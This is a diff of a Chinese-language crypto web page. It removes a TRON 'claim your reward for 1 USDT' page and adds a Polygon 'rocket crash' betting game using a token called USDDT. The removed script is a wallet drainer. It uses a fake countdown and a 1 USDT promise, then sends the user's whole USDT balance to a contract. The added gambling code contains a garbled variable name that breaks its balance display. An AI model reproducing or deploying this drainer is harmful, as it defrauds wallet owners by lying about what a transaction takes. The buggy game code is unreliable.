@@ -3,107 +3,427 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>领取奖励</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
-        h1 { color: #ff4500; font-size: 28px; }
-        #countdown { color: #ff0000; font-size: 20px; margin: 10px 0; }
-        #qrcode-container { border: 5px solid #ffd700; padding: 20px; background: #fff; display: inline-block; border-radius: 10px; }
-        img { max-width: 200px; }
-        #popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; padding: 20px; border: 2px solid #ff4500; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 1000; }
-        #popup button { padding: 10px 20px; font-size: 16px; background-color: #ff4500; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        #popup button:hover { background-color: #e03e00; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; }
-    </style>
+    <title>火箭冲天游戏</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <h1>仅需支付1USDT即可领取奖励！</h1>
-    <div id="countdown">活动倒计时：23小时59分</div>
-    <div id="qrcode-container">
-        <img src="/rm123/rm.png" alt="二维码">
-        <p>扫码支付1USDT</p>
-    </div>
-
-    <div id="overlay"></div>
-    <div id="popup">
-        <h2>确认支付1USDT</h2>
-        <p>请点击下方按钮验证钱包并支付1USDT领取奖励！</p>
-        <button onclick="confirmTransfer()">确认支付</button>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-4 text-center">火箭冲天游戏</h1>
+        <div id="wallet" class="mb-4">
+            <button id="connectWallet" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">连接 MetaMask 钱包</button>
+            <p id="walletAddress" class="text-sm text-gray-600 mt-2"></p>
+        </div>
+        <div id="config" class="mb-4 hidden">
+            <label for="crashAddress" class="block text-sm font-medium text-gray-700">Crash 合约地址</label>
+            <input type="text" id="crashAddress" value="0x983C106e6f775e5EB7f6Fb97bD00d057a79dE079" class="mt-1 p-2 w-full border rounded" placeholder="输入 Crash 合约地址">
+            <label for="usddtAddress" class="block text-sm font-medium text-gray-700 mt-2">USDDT 代币地址</label>
+            <input type="text" id="usddtAddress" value="0x06f90CC0C9d22006E4792b27D612aC515C0673bC" class="mt-1 p-2 w-full border rounded" placeholder="输入 USDDT 代币地址">
+        </div>
+        <div id="game" class="hidden">
+            <div class="mb-4">
+                <label for="betAmount" class="block text-sm font-medium text-gray-700">下注金额 (USDDT)</label>
+                <input type="number" id="betAmount" min="0.1" max="1000" step="0.1" class="mt-1 p-2 w-full border rounded" placeholder="输入下注金额">
+            </div>
+            <button id="placeBet" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600">下注</button>
+            <button id="checkWallet" class="w-full bg-yellow-500 text-white py-2 rounded hover:bg-yellow-600 mt-2">检查钱包</button>
+            <button id="retry" class="w-full bg-gray-500 text-white py-2 rounded hover:bg-gray-600 mt-2">重试</button>
+            <p id="balance" class="mt-2 text-sm text-gray-600"></p>
+            <p id="contractInfo" class="mt-2 text-sm text-gray-600"></p>
+            <p id="walletCheckResult" class="mt-2 text-sm text-gray-600 whitespace-pre-wrap"></p>
+            <p id="result" class="mt-4 text-sm text-gray-600"></p>
+        </div>
     </div>
 
     <script>
-        const usdtContractAddress = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // Nile 测试网 USDT 地址
-        const splitterContractAddress = "TLod9Hy4yuEe9UYd73xsGS876HHN4tfsVs"; // 替换为部署后的合约地址
-        const paymentAmountUSDT = 1; // 固定支付金额 1 USDT
-
-        let tronWebGlobal, userAddressGlobal;
-
-        async function transferToContract(tronWeb, userAddress) {
-            console.log("Transferring USDT to contract...");
-
-            // 获取 USDT 合约实例
-            const usdtContract = await tronWeb.contract().at(usdtContractAddress);
-
-            // 检查余额
-            const balance = await usdtContract.balanceOf(userAddress).call();
-            const usdtBalance = balance.toNumber() / 1000000; // 转换为 USDT 单位 (6位小数)
-            console.log("TRC-20 USDT balance:", usdtBalance);
-
-            if (usdtBalance < paymentAmountUSDT) {
-                alert("余额不足，无法支付1 USDT！");
-                return;
+        const CRASH_ABI = [
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "_usddt", "type": "address"},
+                    {"internalType": "address", "name": "_dividendPool", "type": "address"},
+                    {"internalType": "address", "name": "initialOwner", "type": "address"}
+                ],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {"indexed": true, "internalType": "address", "name": "player", "type": "address"},
+                    {"indexed": false, "internalType": "uint256", "name": "bet", "type": "uint256"},
+                    {"indexed": false, "internalType": "uint256", "name": "multiplier", "type": "uint256"},
+                    {"indexed": false, "internalType": "uint256", "name": "payout", "type": "uint256"}
+                ],
+                "name": "BetPlaced",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "DIVIDEND_POOL",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "MAX_BET",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "MIN_BET",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "PLATFORM",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "dividendPool",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "uint256", "name": "_bet", "type": "uint256"}],
+                "name": "placeBet",
+                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "usddt",
+                "outputs": [{"internalType": "contract IERC20", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
+                "name": "withdrawUSDDT",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
             }
+        ];
+        const USDDT_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "value", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{"name": "account", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "recipient", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "transfer",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {"name": "owner", "type": "address"},
+                    {"name": "spender", "type": "address"}
+                ],
+                "name": "allowance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "name",
+                "outputs": [{"name": "", "type": "string"}],
+                "type": "function"
+            }
+        ];
 
-            // 直接转账到智能合约
-            const amountToTransfer = balance; // 转入全部余额
-            await usdtContract.transfer(splitterContractAddress, amountToTransfer).send();
-            console.log("USDT transferred to splitter contract");
-            alert("奖励领取成功！");
-        }
+        let web3, crash, usddt, account, minBet, maxBet;
 
-        async function confirmTransfer() {
-            document.getElementById('popup').style.display = 'none';
-            document.getElementById('overlay').style.display = 'none';
-
-            // 检测 TRON 钱包
-            let tronWeb;
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
-                tronWeb = window.tronWeb;
-                console.log("Detected TronLink or compatible TRON wallet");
+        async function init() {
+            let provider = window.ethereum;
+            if (typeof provider !== 'undefined' && provider.isMetaMask) {
+                web3 = new Web3(provider);
+                document.getElementById('connectWallet').addEventListener('click', connectWallet);
+                document.getElementById('checkWallet').addEventListener('click', checkWallet);
+                document.getElementById('retry').addEventListener('click', () => window.location.reload());
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    account = accounts[0];
+                    updateWalletInfo();
+                });
+                window.ethereum.on('chainChanged', () => window.location.reload());
+                await connectWallet();
             } else {
-                console.log("No TRON wallet detected");
-                alert("请安装 TronLink 或其他兼容钱包！");
-                return;
+                alert('请安装 MetaMask，并禁用 TronLink、chext 等插件！建议使用干净浏览器，仅安装 MetaMask！');
             }
-
-            // 确保切换到 Nile 测试网
-            if (tronWeb.fullNode.host !== "https://api.nileex.io") {
-                alert("请切换到 Nile 测试网！");
-                return;
-            }
-
-            const userAddress = tronWeb.defaultAddress.base58;
-            tronWebGlobal = tronWeb;
-            userAddressGlobal = userAddress;
-
-            await transferToContract(tronWeb, userAddress);
         }
 
-        function showPopup() {
-            document.getElementById('popup').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        }
-
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                if (window.tronWeb) {
-                    showPopup();
-                } else {
-                    console.log("No TRON wallet detected after timeout");
+        async function connectWallet() {
+            try {
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (parseInt(chainId, 16) !== 137) {
+                    alert('请切换到 Polygon 主网（链 ID 137）！');
+                    return;
                 }
-            }, 1000);
-        });
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                await initializeContracts();
+                await updateWalletInfo();
+                document.getElementById('wallet').classList.add('hidden');
+                document.getElementById('config').classList.remove('hidden');
+                document.getElementById('game').classList.remove('hidden');
+                document.getElementById('placeBet').addEventListener('click', placeBet);
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+                alert(`连接 MetaMask 失败: ${error.message}。请检查 MetaMask 或禁用 chext 等插件！`);
+            }
+        }
+
+        async function initializeContracts() {
+            const crashAddress = document.getElementById('crashAddress').value;
+            const usddtAddress = document.getElementById('usddtAddress').value;
+            if (!web3.utils.isAddress(crashAddress) || !web3.utils.isAddress(usddtAddress)) {
+                alert('请输入有效的 Crash 或 USDDT 地址！');
+                return;
+            }
+            try {
+                crash = new web3.eth.Contract(CRASH_ABI, crashAddress);
+                usddt = new web3.eth.Contract(USDDT_ABI, usddtAddress);
+                await usddt.methods.balanceOf(account).call();
+                console.log(`USDDT 合约验证成功: ${usddtAddress}`);
+            } catch (error) {
+                console.error('初始化 USDDT 合约失败:', error);
+                alert(`USDDT 地址 ${usddtAddress} 初始化失败: ${error.message}！请检查合约状态！`);
+                return;
+            }
+            try {
+                const contractUsddt = await crash.methods.usddt().call();
+                minBet = await crash.methods.MIN_BET().call();
+                maxBet = await crash.methods.MAX_BET().call();
+                if (contractUsddt.toLowerCase() !== usddtAddress.toLowerCase()) {
+                    alert(`Crash 合约的 USDDT 地址不匹配！合约: ${contractUsddt}, 输入: ${usddtAddress}`);
+                    return;
+                }
+                console.log(`Crash 合约验证成功: ${crashAddress}`);
+            } catch (error) {
+                console.error('初始化 Crash 合约失败:', error);
+                alert(`Crash 地址 ${crashAddress} 无效或配置错误！请检查地址或合约状态！`);
+                return;
+            }
+        }
+
+        async function checkWallet() {
+            try {
+                const chainId = await web3.eth.getChainId();
+                const usddtBalance = await usddt.methods.balanceOf(account).call();
+                const contractBalance = await usddt.methods.balanceOf(document.getElementById('crashAddress').value).call();
+                const contractUsddt = await crash.methods.usddt().call();
+                const owner = await crash.methods.owner().call();
+                const allowance = await usddt.methods.allowance(account, document.getElementById('crashAddress').value).call();
+                const minBetWei = await crash.methods.MIN_BET().call();
+                const maxBetWei = await crash.methods.MAX_BET().call();
+                let usddtName = 'USDDT';
+                try {
+                    usddtName = await usddt.methods.name().call();
+                } catch (e) {
+                    console.warn('USDDT 合约无 name 函数');
+                }
+                let status = `钱包检查结果：\n`;
+                status += `账户地址: ${account}\n`;
+                status += `网络: ${chainId === 137 ? 'Polygon 主网' : '错误网络（需 Polygon 主网，链 ID 137）'}\n`;
+                status += `USDDT 余额: ${web3.utils.fromWei(usddtBalance, 'ether')} USDDT\n`;
+                status += `已授权给 Crash 合约: ${web3.utils.fromWei(allowance, 'ether')} USDDT\n`;
+                status += `USDDT 代币名称: ${usddtName}\n`;
+                status += `USDDT 地址: ${document.getElementById('usddtAddress').value}\n`;
+                status += `Crash 合约地址: ${document.getElementById('crashAddress').value}\n`;
+                status += `合约奖池: ${web3.utils.fromWei(contractBalance, 'ether')} USDDT\n`;
+                status += `合约配置的 USDDT: ${contractUsddt}\n`;
+                status += `合约拥有者: ${owner}\n`;
+                status += `最小下注: ${web3.utils.fromWei(minBetWei, 'ether')} USDDT\n`;
+                status += `最大下注: ${web3.utils.fromWei(maxBetWei, 'ether')} USDDT\n`;
+                document.getElementById('walletCheckResult').textContent = status;
+            } catch (error) {
+                console.error('检查钱包失败:', error);
+                document.getElementById('walletCheckResult').textContent = `检查钱包失败: ${error.message}。请确认合约状态！`;
+            }
+        }
+
+        async function updateWalletInfo() {
+            document.getElementById('walletAddress').textContent = `已连接: ${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
+            if (!usddt || !crash) {
+                document.getElementById('balance').textContent = '合约未初始化，请检查地址！';
+                document.getElementById('contractInfo').textContent = '合约未初始化，请检查地址！';
+                return;
+            }
+            try {
+                const usddმbalance = await usddt.methods.balanceOf(account).call();
+                const contractBalance = await usddt.methods.balanceOf(document.getElementById('crashAddress').value).call();
+                const contractUsddt = await crash.methods.usddt().call();
+                const dividendPool = await crash.methods.dividendPool().call();
+                const owner = await crash.methods.owner().call();
+                const allowance = await usddt.methods.allowance(account, document.getElementById('crashAddress').value).call();
+                const minBetWei = await crash.methods.MIN_BET().call();
+                const maxBetWei = await crash.methods.MAX_BET().call();
+                let usddtName = 'USDDT';
+                try {
+                    usddtName = await usddt.methods.name().call();
+                } catch (e) {
+                    console.warn('USDDT 合约无 name 函数');
+                }
+                document.getElementById('balance').textContent = `USDDT 余额: ${web3.utils.fromWei(usddtBalance, 'ether')} USDDT | 已授权: ${web3.utils.fromWei(allowance, 'ether')} USDDT`;
+                document.getElementById('contractInfo').textContent = `合约奖池: ${web3.utils.fromWei(contractBalance, 'ether')} USDDT | 最小下注: ${web3.utils.fromWei(minBetWei, 'ether')} USDDT | 最大下注: ${web3.utils.fromWei(maxBetWei, 'ether')} USDDT | 合约 USDDT: ${contractUsddt.substring(0, 6)}...${contractUsddt.substring(contractUsddt.length - 4)} | 分红池: ${dividendPool.substring(0, 6)}...${dividendPool.substring(dividendPool.length - 4)} | 拥有者: ${owner.substring(0, 6)}...${owner.substring(owner.length - 4)}`;
+            } catch (error) {
+                console.error('获取信息失败:', error);
+                document.getElementById('balance').textContent = '获取余额失败，请检查合约状态！';
+                document.getElementById('contractInfo').textContent = '获取合约信息失败，请检查合约地址！';
+            }
+        }
+
+        async function placeBet() {
+            const betAmount = document.getElementById('betAmount').value;
+            try {
+                document.getElementById('result').textContent = '处理中...';
+                const betWei = web3.utils.toWei(betAmount.toString(), 'ether');
+                const usddtBalance = await usddt.methods.balanceOf(account).call();
+                if (usddtBalance < betWei) {
+                    alert(`USDDT 余额不足！当前: ${web3.utils.fromWei(usddtBalance, 'ether')} USDDT，需: ${betAmount} USDDT`);
+                    document.getElementById('result').textContent = '';
+                    return;
+                }
+                const contractBalance = await usddt.methods.balanceOf(document.getElementById('crashAddress').value).call();
+                console.log(`合约奖池余额: ${web3.utils.fromWei(contractBalance, 'ether')} USDDT`);
+                if (contractBalance < web3.utils.toWei('10000', 'ether')) {
+                    alert(`合约奖池不足！当前: ${web3.utils.fromWei(contractBalance, 'ether')} USDDT，需至少 10000 USDDT。请管理员（0xB0C096d0709eD134Ba3e179d1Fa1F1C32d62E878）转账到: ${document.getElementById('crashAddress').value}`);
+                    document.getElementById('result').textContent = '';
+                    return;
+                }
+                const contractUsddt = await crash.methods.usddt().call();
+                const usddtAddress = document.getElementById('usddtAddress').value;
+                if (contractUsddt.toLowerCase() !== usddtAddress.toLowerCase()) {
+                    alert(`合约 USDDT 地址不匹配！合约: ${contractUsddt}, 输入: ${usddtAddress}`);
+                    document.getElementById('result').textContent = '';
+                    return;
+                }
+                const minBetWei = await crash.methods.MIN_BET().call();
+                const maxBetWei = await crash.methods.MAX_BET().call();
+                if (betWei < minBetWei || betWei > maxBetWei) {
+                    alert(`下注金额超出范围！最小: ${web3.utils.fromWei(minBetWei, 'ether')} USDDT，最大: ${web3.utils.fromWei(maxBetWei, 'ether')} USDDT`);
+                    document.getElementById('result').textContent = '';
+                    return;
+                }
+                const allowance = await usddt.methods.allowance(account, document.getElementById('crashAddress').value).call();
+                console.log(`当前授权: ${web3.utils.fromWei(allowance, 'ether')} USDDT`);
+                if (parseFloat(web3.utils.fromWei(allowance, 'ether')) < parseFloat(betAmount)) {
+                    alert('即将清零旧授权并重新授权 USDDT 支出，请在 MetaMask 确认两次交易！建议 Gas Limit 设为 600,000，Gas Price 30-50 Gwei');
+                    let clearTxHash = '';
+                    try {
+                        console.log(`尝试清零授权给 ${document.getElementById('crashAddress').value}`);
+                        await usddt.methods.approve(document.getElementById('crashAddress').value, 0).call({ from: account });
+                        const clearTx = await usddt.methods.approve(document.getElementById('crashAddress').value, 0).send({
+                            from: account,
+                            gas: 600000,
+                            gasPrice: web3.utils.toWei('50', 'gwei')
+                        });
+                        clearTxHash = clearTx.transactionHash;
+                        console.log(`清零授权成功，交易哈希: ${clearTxHash}`);
+                    } catch (clearError) {
+                        console.error('清零授权失败:', clearError);
+                        throw new Error(`清零授权失败: ${clearError.message}。交易哈希: ${clearTxHash || '未生成'}。请检查 USDDT 合约状态（是否锁仓、黑名单、权限）、Gas 设置或 RPC！`);
+                    }
+                    let approveTxHash = '';
+                    try {
+                        console.log(`尝试授权 ${betAmount} USDDT 给 ${document.getElementById('crashAddress').value}`);
+                        await usddt.methods.approve(document.getElementById('crashAddress').value, betWei).call({ from: account });
+                        const approveTx = await usddt.methods.approve(document.getElementById('crashAddress').value, betWei).send({
+                            from: account,
+                            gas: 600000,
+                            gasPrice: web3.utils.toWei('50', 'gwei')
+                        });
+                        approveTxHash = approveTx.transactionHash;
+                        console.log(`授权成功: ${betAmount} USDDT, 交易哈希: ${approveTxHash}`);
+                    } catch (approveError) {
+                        console.error('授权失败:', approveError);
+                        throw new Error(`授权 USDDT 失败: ${approveError.message}。交易哈希: ${approveTxHash || '未生成'}。请检查 USDDT 合约状态（是否锁仓、黑名单、权限）、Gas 设置或 RPC！`);
+                    }
+                } else {
+                    console.log('已有足够授权，跳过 approve');
+                }
+                alert('授权已足够，即将下注，请确认！建议 Gas Limit 设为 800,000，Gas Price 30-50 Gwei');
+                console.log(`尝试下注 ${betAmount} USDDT`);
+                try {
+                    await crash.methods.placeBet(betWei).call({ from: account });
+                } catch (callError) {
+                    console.error('模拟下注失败:', callError);
+                    throw new Error(`下注失败: ${callError.message}。请检查 Crash 合约状态或联系管理员！`);
+                }
+                const tx = await crash.methods.placeBet(betWei).send({
+                    from: account,
+                    gas: 800000,
+                    gasPrice: web3.utils.toWei('50', 'gwei')
+                });
+                console.log(`下注成功，交易哈希: ${tx.transactionHash}`);
+                crash.getPastEvents('BetPlaced', {
+                    filter: { player: account },
+                    fromBlock: tx.blockNumber,
+                    toBlock: tx.blockNumber
+                }).then(events => {
+                    const event = events[0];
+                    const multiplier = web3.utils.fromWei(event.returnValues.multiplier, 'ether');
+                    const payout = web3.utils.fromWei(event.returnValues.payout, 'ether');
+                    document.getElementById('result').textContent = `倍数: ${multiplier}x, 奖金: ${payout} USDDT`;
+                    updateWalletInfo();
+                });
+            } catch (error) {
+                console.error('下注失败:', error);
+                let errorMsg = '下注失败：';
+                if (error.message.includes('revert')) {
+                    errorMsg += '合约调用失败，可能金额超出范围、USDDT 合约锁仓、黑名单或账户受限';
+                } else if (error.message.includes('denied')) {
+                    errorMsg += '用户拒绝交易，请确认 MetaMask 交易';
+                } else if (error.message.includes('invalid address')) {
+                    errorMsg += '无效的合约地址';
+                } else if (error.message.includes('execution reverted')) {
+                    errorMsg += '合约逻辑错误，可能授权不足、USDDT 状态受限或 Gas 不足';
+                } else if (error.message.includes('Internal JSON-RPC error')) {
+                    errorMsg += 'MetaMask 内部错误，可能 RPC 不稳定、Gas 不足或 USDDT 合约限制（锁仓、黑名单）';
+                } else {
+                    errorMsg += error.message;
+                }
+                document.getElementById('result').textContent = errorMsg;
+            }
+        }
+
+        window.onload = init;
     </script>
 </body>
 </html>
